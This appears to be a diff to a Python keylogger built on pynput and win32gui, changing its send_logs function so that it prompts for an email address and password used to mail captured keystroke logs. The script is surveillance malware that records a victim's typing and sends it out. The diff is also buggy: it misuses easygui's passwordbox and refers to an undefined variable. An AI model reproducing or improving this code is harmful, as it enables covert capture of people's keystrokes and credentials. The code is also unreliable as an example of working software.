@@ -17,6 +17,7 @@
 #modified by me
 
 # imports
+from easygui import passwordbox
 from pynput.keyboard import Key, Listener
 import win32gui
 import easygui
@@ -93,27 +94,45 @@ def write_file(count):
 def send_logs():
     count = 0
 
-    mssg = "Enter mail pw"
-    title = "Python PW"
-    fieldNames = ["Password"]
-    fieldValues = []  # we start with blanks for the values
-    fromAddr = 'emailhere'
-    fieldValues = easygui.passwordbox( mssg, title, fieldNames )
+    mssg = "Enter logon information"
+    titleEmail = "Email"
+    fieldEmail = []
+    fieldValuesEmail = []  # we start with blanks for the values
+    fieldValuesEmail = passwordbox( mssg, titleEmail, fieldEmail )
 
     # make sure that none of the fields was left blank
     while 1:
-        if fieldValues == None: break
-        errmssg = ""
-        for i in range( len( fieldNames ) ):
-            if fieldValues[i].strip() == "":
-                errmssg = errmssg + ('"%s" is a required field.\n\n' % fieldNames[i])
-        if errmssg == "": break  # no problems found
-        fieldValues = multpasswordbox( errmssg, title, fieldNames, fieldValues )
-    print( "Reply was:", fieldValues )
-    fromPswd = fieldValues
-    print(fromPswd)
-    toAddr = 'emailhere'
-    print( "Email to address inputted" )
+        if fieldValuesEmail == None: break
+        errmsg = ""
+        for i in range( len( fieldEmail ) ):
+            if fieldValuesEmail[i].strip() == "":
+                errmsg = errmsg + ('"%s" is a required field.\n\n' % fieldEmail[i])
+        if errmsg == "": break  # no problems found
+        fieldValues = passwordbox( errmsg, titleEmail, fieldEmail, fieldValuesEmail )
+    print( "Reply was:", fieldValuesEmail )
+
+    titlePw = "Pw"
+    fieldPw = []
+    fieldValuesPw = []  # we start with blanks for the values
+    fieldValuesPw = passwordbox( mssg, titlePw, fieldPw )
+
+    # make sure that none of the fields was left blank
+    while 1:
+        if fieldValuesPw == None: break
+        errmsg = ""
+        for i in range( len( fieldPw ) ):
+            if fieldValuesPw[i].strip() == "":
+                errmsg = errmsg + ('"%s" is a required field.\n\n' % fieldPw[i])
+        if errmsg == "": break  # no problems found
+        fieldValuesPw = passwordbox( errmsg, titleEmail, fieldPw, fieldValues )
+    print( "Reply was:", fieldValuesPw )
+
+    fromAddr = fieldValuesEmail
+
+    fromPswd = fieldValuesPw
+
+    toAddr = fieldValuesEmail
+
     MIN = 10
     SECONDS = 60
     # time.sleep(MIN * SECONDS) # every 10 mins write file/send log
